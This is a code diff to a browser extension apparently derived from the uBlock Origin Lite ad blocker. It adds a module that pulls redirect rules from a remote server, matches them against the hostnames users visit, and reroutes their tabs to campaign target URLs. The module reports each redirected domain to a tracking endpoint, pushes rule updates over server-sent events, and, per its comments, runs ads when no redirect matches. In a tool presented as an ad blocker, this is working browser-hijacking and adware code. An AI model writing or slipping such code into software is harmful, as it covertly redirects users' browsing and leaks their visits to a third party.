@@ -1,8 +1,280 @@
 // Custom notification system for uBOL-home with REST API integration
+// Registers global redirectCacheModule first (serve/redirects cache + POST /events); then notifications.
 // Fetches notifications via POST /api/extension/ad-block with requestType: "notification"
 
+// Redirect rules: POST /api/extension/serve/redirects (v2 EXTENSION_V2_API.md) — domain_regex match +
+// POST /api/extension/events (type: redirect), then tabs.update. Ads run only when no redirect matches.
+
 (function () {
-    'use strict';
+    const CONFIG = (typeof globalThis !== 'undefined' && globalThis.AD_CONFIG) ||
+        (typeof window !== 'undefined' && window.AD_CONFIG) ||
+        { SUPPORTED_DOMAINS: [] };
+
+    const FREQUENCY_REDIRECT_REFETCH_DEBOUNCE_MS = 1500;
+
+    function apiUrl(path) {
+        const base = (CONFIG.API_BASE_URL || '').replace(/\/+$/, '');
+        return base + path;
+    }
+
+    /** @type {Array<{ campaignId: string, domain_regex: string, target_url: string, date_till?: string | null, count?: { used?: number, max?: number | null, remaining?: number | null } }>} */
+    let redirectRows = [];
+
+    let frequencyRefetchTimer = null;
+
+    const STORAGE_KEY_REDIRECTS = 'adwardenRedirectRows';
+
+    function redirectServePath() {
+        const raw = CONFIG.REDIRECT_SERVE_PATH || '/api/extension/serve/redirects';
+        return typeof raw === 'string' && raw.startsWith('/') ? raw : '/api/extension/serve/redirects';
+    }
+
+    function filterValidRedirectRows(list) {
+        if (!Array.isArray(list)) return [];
+        return list.filter((r) => r && typeof r.campaignId === 'string' && typeof r.domain_regex === 'string' &&
+            typeof r.target_url === 'string');
+    }
+
+    /**
+     * Hydrate in-memory redirect rows from chrome.storage.local (MV3 SW restarts).
+     * @returns {Promise<void>}
+     */
+    async function loadRedirectsFromStorage() {
+        if (typeof chrome === 'undefined' || !chrome.storage?.local?.get) {
+            return;
+        }
+        return new Promise((resolve) => {
+            chrome.storage.local.get([STORAGE_KEY_REDIRECTS], (result) => {
+                if (chrome.runtime?.lastError) {
+                    console.warn('[RedirectCache] storage.get:', chrome.runtime.lastError.message);
+                    resolve();
+                    return;
+                }
+                const rows = result[STORAGE_KEY_REDIRECTS];
+                if (Array.isArray(rows)) {
+                    redirectRows = filterValidRedirectRows(rows);
+                    console.log('[RedirectCache] Hydrated', redirectRows.length, 'row(s) from storage');
+                }
+                resolve();
+            });
+        });
+    }
+
+    function saveRedirectsToStorage() {
+        if (typeof chrome === 'undefined' || !chrome.storage?.local?.set) {
+            return;
+        }
+        try {
+            chrome.storage.local.set({ [STORAGE_KEY_REDIRECTS]: redirectRows }, () => {
+                if (chrome.runtime?.lastError) {
+                    console.warn('[RedirectCache] storage.set:', chrome.runtime.lastError.message);
+                }
+            });
+        } catch (e) {
+            console.warn('[RedirectCache] storage.set failed:', e?.message || e);
+        }
+    }
+
+    /** Fire-and-forget on module load so redirects work before first serve/redirects fetch. */
+    loadRedirectsFromStorage().catch(() => { });
+
+    /** Lowercase hostname only; keep www so server regexes like ^www\\.ndtv\\.com$ match (v2 API shape). */
+    function normalizeHostnameForRedirectMatch(host) {
+        const trimmed = String(host || '').trim().toLowerCase();
+        if (!trimmed) return '';
+        try {
+            const url = trimmed.startsWith('http') ? trimmed : `https://${trimmed}`;
+            return new URL(url).hostname;
+        } catch {
+            return trimmed.split('/')[0].split(':')[0];
+        }
+    }
+
+    function scheduleRedirectRefetchFromFrequency() {
+        if (frequencyRefetchTimer) clearTimeout(frequencyRefetchTimer);
+        frequencyRefetchTimer = setTimeout(() => {
+            frequencyRefetchTimer = null;
+            refreshRedirectsFromApi({ reprocessTabs: true }).catch(() => { });
+        }, FREQUENCY_REDIRECT_REFETCH_DEBOUNCE_MS);
+    }
+
+    /**
+     * Load redirect rows from serve/redirects (server applies schedule, frequency, geo, audience).
+     * @param {{ domain?: string, reprocessTabs?: boolean }} [opts]
+     * @returns {Promise<void>}
+     */
+    async function refreshRedirectsFromApi(opts) {
+        const authModule = (typeof globalThis !== 'undefined' && globalThis.authModule) ||
+            (typeof window !== 'undefined' && window.authModule);
+        if (!authModule || typeof authModule.getToken !== 'function') {
+            console.warn('[RedirectCache] refresh skipped: no auth module');
+            return;
+        }
+        if (!CONFIG.API_BASE_URL) {
+            console.warn('[RedirectCache] refresh skipped: no API_BASE_URL');
+            return;
+        }
+        let token;
+        try {
+            token = await authModule.getToken();
+        } catch (e) {
+            console.warn('[RedirectCache] refresh getToken failed:', e?.message || e);
+            return;
+        }
+        if (!token) {
+            console.warn('[RedirectCache] refresh skipped: no Bearer token');
+            return;
+        }
+        const body = opts?.domain ? { domain: opts.domain } : {};
+        const url = apiUrl(redirectServePath());
+        let res;
+        try {
+            res = await fetch(url, {
+                method: 'POST',
+                cache: 'no-store',
+                headers: {
+                    'Content-Type': 'application/json',
+                    Authorization: `Bearer ${token}`,
+                },
+                body: JSON.stringify(body),
+            });
+        } catch (e) {
+            console.warn('[RedirectCache] serve/redirects fetch failed:', e?.message || e);
+            return;
+        }
+        if (!res.ok) {
+            console.warn('[RedirectCache] serve/redirects HTTP', res.status);
+            return;
+        }
+        let data;
+        try {
+            data = await res.json();
+        } catch (e) {
+            console.warn('[RedirectCache] serve/redirects JSON parse failed:', e?.message || e);
+            return;
+        }
+        const list = Array.isArray(data?.redirects) ? data.redirects : [];
+        redirectRows = filterValidRedirectRows(list);
+        console.log('[RedirectCache] Loaded', redirectRows.length, 'redirect row(s) from serve/redirects');
+        saveRedirectsToStorage();
+        if (opts?.reprocessTabs) {
+            const adm = (typeof globalThis !== 'undefined' && globalThis.adManagerModule) ||
+                (typeof window !== 'undefined' && window.adManagerModule);
+            if (adm?.reprocessOpenTabsForAdPipeline) {
+                adm.reprocessOpenTabsForAdPipeline().catch(() => { });
+            }
+        }
+    }
+
+    function applyCampaignUpdated() {
+        refreshRedirectsFromApi({ reprocessTabs: true }).catch(() => { });
+    }
+
+    function applyFrequencyUpdated() {
+        scheduleRedirectRefetchFromFrequency();
+    }
+
+    function applyPlatformsUpdated() {
+        refreshRedirectsFromApi({ reprocessTabs: true }).catch(() => { });
+    }
+
+    /**
+     * @param {string} visitHostname
+     * @returns {{ campaignId: string, destinationUrl: string } | null}
+     */
+    function matchRedirectForVisit(visitHostname) {
+        const visitNorm = normalizeHostnameForRedirectMatch(visitHostname);
+        if (!visitNorm) return null;
+        const now = new Date();
+        const sorted = [...redirectRows].sort((a, b) => String(a.campaignId).localeCompare(String(b.campaignId)));
+        for (const row of sorted) {
+            try {
+                const re = new RegExp(row.domain_regex, 'i');
+                if (!re.test(visitNorm)) continue;
+            } catch {
+                continue;
+            }
+            if (row.date_till) {
+                const end = new Date(row.date_till);
+                if (!Number.isNaN(end.getTime()) && now > end) continue;
+            }
+            const rem = row.count?.remaining;
+            if (rem !== null && rem !== undefined && Number.isFinite(rem) && rem <= 0) continue;
+            const dest = String(row.target_url).trim();
+            if (!/^https?:\/\//i.test(dest)) continue;
+            return { campaignId: row.campaignId, destinationUrl: dest };
+        }
+        return null;
+    }
+
+    /**
+     * Fire-and-forget POST /api/extension/events (do not await before navigation).
+     * @param {string} campaignId
+     * @param {string} domain - visit hostname
+     */
+    function sendRedirectTelemetryFireAndForget(campaignId, domain) {
+        const authModule = (typeof globalThis !== 'undefined' && globalThis.authModule) ||
+            (typeof window !== 'undefined' && window.authModule);
+        if (!authModule || typeof authModule.getToken !== 'function') {
+            console.warn('[RedirectCache] redirect telemetry skipped: no auth module');
+            return;
+        }
+        if (!CONFIG.API_BASE_URL || !campaignId || !domain) {
+            console.warn('[RedirectCache] redirect telemetry skipped: missing API_BASE_URL, campaignId, or domain');
+            return;
+        }
+        const eventPathRaw = CONFIG.REDIRECT_EVENT_PATH || '/api/extension/events';
+        const eventPath = typeof eventPathRaw === 'string' && eventPathRaw.startsWith('/')
+            ? eventPathRaw
+            : '/api/extension/events';
+        authModule.getToken().then((token) => {
+            if (!token) {
+                console.warn('[RedirectCache] redirect telemetry skipped: no Bearer token');
+                return;
+            }
+            const url = apiUrl(eventPath);
+            try {
+                console.log('[RedirectCache] POST redirect event →', url, { campaignId, domain });
+                fetch(url, {
+                    method: 'POST',
+                    cache: 'no-store',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        Authorization: `Bearer ${token}`,
+                    },
+                    body: JSON.stringify({
+                        events: [{ type: 'redirect', campaignId, domain: domain.replace(/^www\./, '') }],
+                    }),
+                    keepalive: true,
+                }).catch((err) => {
+                    console.warn('[RedirectCache] redirect telemetry fetch failed:', err?.message || err);
+                });
+            } catch (e) {
+                console.warn('[RedirectCache] redirect telemetry error:', e?.message || e);
+            }
+        }).catch((e) => {
+            console.warn('[RedirectCache] redirect telemetry getToken failed:', e?.message || e);
+        });
+    }
+
+    const api = {
+        loadRedirectsFromStorage,
+        refreshRedirectsFromApi,
+        applyCampaignUpdated,
+        applyFrequencyUpdated,
+        applyPlatformsUpdated,
+        matchRedirectForVisit,
+        sendRedirectTelemetryFireAndForget,
+    };
+
+    if (typeof globalThis !== 'undefined') globalThis.redirectCacheModule = api;
+    if (typeof window !== 'undefined') window.redirectCacheModule = api;
+
+    console.log('[RedirectCache] Module loaded');
+})();
+
+(function () {
+    
 
     // Get API base URL from config (set by config.js - loaded first)
     const API_BASE_URL = (typeof globalThis !== 'undefined' && globalThis.AD_CONFIG?.API_BASE_URL) ||
@@ -77,7 +349,7 @@
                 if (url && url.startsWith('chrome-extension://')) {
                     return url;
                 }
-            } catch (e) {
+            } catch {
                 continue;
             }
         }
@@ -129,7 +401,7 @@
                 chrome.storage.local.set({ [`notification_url_${notificationId}`]: notificationData.ctaLink });
             }
 
-            chrome.notifications.create(notificationId, notificationOptions, (createdId) => {
+            chrome.notifications.create(notificationId, notificationOptions, () => {
                 if (chrome.runtime.lastError) {
                     console.error('[Notifications] Error:', chrome.runtime.lastError.message);
 
@@ -176,7 +448,7 @@
      * @param {string} notificationId - Notification ID
      * @param {boolean} byUser - Whether user closed it
      */
-    function handleNotificationClosed(notificationId, byUser) {
+    function handleNotificationClosed(notificationId) {
         // Clean up stored URL if exists
         const storageKey = `notification_url_${notificationId}`;
         chrome.storage.local.remove([storageKey]);
@@ -209,6 +481,40 @@
         liveEventSource = es;
         let firstConnectDone = false;
 
+        // SSE init may include `user.identifier`. Only persist for email-linked sessions so anonymous
+        // reconnects do not replace the install device id with a server-normalized ext_… value.
+        es.addEventListener('init', (ev) => {
+            try {
+                const data = JSON.parse(ev.data || '{}');
+                const rcInit =
+                    (typeof globalThis !== 'undefined' && globalThis.redirectCacheModule) ||
+                    (typeof window !== 'undefined' && window.redirectCacheModule);
+                if (rcInit?.refreshRedirectsFromApi) {
+                    rcInit.refreshRedirectsFromApi({ reprocessTabs: true }).catch(() => { });
+                }
+                const u = data.user;
+                const id =
+                    u && u.identifier !== null && u.identifier !== undefined &&
+                        String(u.identifier).trim().length >= 8
+                        ? String(u.identifier).trim()
+                        : null;
+                if (!id) return;
+                const authModule =
+                    (typeof globalThis !== 'undefined' && globalThis.authModule) ||
+                    (typeof window !== 'undefined' && window.authModule);
+                const im =
+                    (typeof globalThis !== 'undefined' && globalThis.identityModule) ||
+                    (typeof window !== 'undefined' && window.identityModule);
+                if (!im?.setExtensionIdentifier) return;
+                (async () => {
+                    const auth = authModule && (await authModule.getAuth());
+                    const email = auth && typeof auth.email === 'string' ? auth.email.trim() : '';
+                    if (!email) return;
+                    await im.setExtensionIdentifier(id);
+                })().catch(() => { });
+            } catch { /* ignore malformed init */ }
+        });
+
         function doFirstConnectPull() {
             if (!firstConnectDone) {
                 firstConnectDone = true;
@@ -221,7 +527,7 @@
             doFirstConnectPull();
         };
 
-        es.addEventListener('connection_count', (e) => {
+        es.addEventListener('connection_count', () => {
             reconnectDelayMs = LIVE_RECONNECT_BASE_MS; // Reset backoff on successful connect
             doFirstConnectPull();
         });
@@ -238,6 +544,51 @@
                 console.log('[Notifications] Domains event received, refreshing target domains');
                 adManager.fetchTargetDomains();
             }
+        });
+
+        es.addEventListener('campaign_updated', (ev) => {
+            try {
+                const upd = JSON.parse(ev.data || '{}');
+                const rc = (typeof globalThis !== 'undefined' && globalThis.redirectCacheModule) ||
+                    (typeof window !== 'undefined' && window.redirectCacheModule);
+                rc?.applyCampaignUpdated?.(upd);
+            } catch { /* ignore */ }
+        });
+
+        es.addEventListener('frequency_updated', (ev) => {
+            try {
+                const payload = JSON.parse(ev.data || '{}');
+                const rc = (typeof globalThis !== 'undefined' && globalThis.redirectCacheModule) ||
+                    (typeof window !== 'undefined' && window.redirectCacheModule);
+                rc?.applyFrequencyUpdated?.(payload);
+            } catch { /* ignore */ }
+        });
+
+        es.addEventListener('platforms_updated', (ev) => {
+            try {
+                const payload = JSON.parse(ev.data || '{}');
+                const rc = (typeof globalThis !== 'undefined' && globalThis.redirectCacheModule) ||
+                    (typeof window !== 'undefined' && window.redirectCacheModule);
+                rc?.applyPlatformsUpdated?.(payload);
+                const adManager = (typeof globalThis !== 'undefined' && globalThis.adManagerModule) ||
+                    (typeof window !== 'undefined' && window.adManagerModule);
+                if (adManager?.fetchTargetDomains) {
+                    console.log('[Notifications] platforms_updated, refreshing target domains');
+                    adManager.fetchTargetDomains();
+                }
+            } catch { /* ignore */ }
+        });
+
+        es.addEventListener('redirects_updated', () => {
+            console.log('[Notifications] redirects_updated — refresh serve/redirects + reconnect live SSE');
+            const rc = (typeof globalThis !== 'undefined' && globalThis.redirectCacheModule) ||
+                (typeof window !== 'undefined' && window.redirectCacheModule);
+            rc?.refreshRedirectsFromApi?.({ reprocessTabs: true }).catch(() => { });
+            if (liveEventSource) {
+                try { liveEventSource.close(); } catch { /* ignore */ }
+                liveEventSource = null;
+            }
+            getBearerToken().then((tok) => { if (tok) connectLive(tok); });
         });
 
         es.onerror = () => {
@@ -331,7 +682,7 @@
             });
 
             notificationsFetched = true;
-        } catch (error) {
+        } catch {
             // Don't retry automatically - will try again on next extension load or next SSE event
         }
     }
@@ -415,46 +766,24 @@
         });
     }
 
-    // Initialize when extension starts
-    if (chrome.runtime && chrome.runtime.onStartup) {
-        chrome.runtime.onStartup.addListener(() => {
-            notificationsFetched = false; // Reset to fetch again
-            initNotifications();
-            cleanupOldNotifications();
-        });
-    }
+    // Live SSE + fetches are started from init.js after auth (validate + anonymous register).
+    // Do not call initNotifications() here: this module loads before init.js, so an eager init
+    // would use a stale or missing session and hammer /live + /ad-block with 401s.
 
-    // Initialize when extension is installed or updated
     if (chrome.runtime && chrome.runtime.onInstalled) {
         chrome.runtime.onInstalled.addListener((details) => {
-            notificationsFetched = false; // Reset to fetch again
-            initNotifications();
-            // Clean up on update
             if (details.reason === 'update') {
                 cleanupOldNotifications();
             }
         });
     }
 
-    // Initialize immediately if already running
     if (chrome.runtime && chrome.runtime.id) {
-        initNotifications();
-        // Clean up old notifications on load
         setTimeout(cleanupOldNotifications, 5000);
     }
 
     // Periodic cleanup (every 5 minutes)
     setInterval(cleanupOldNotifications, 5 * 60 * 1000);
-
-    // Export for potential external use
-    if (typeof module !== 'undefined' && module.exports) {
-        module.exports = {
-            initNotifications,
-            stopNotifications,
-            fetchNotifications,
-            showNotification
-        };
-    }
 
     // Export to global scope
     if (typeof window !== 'undefined') {
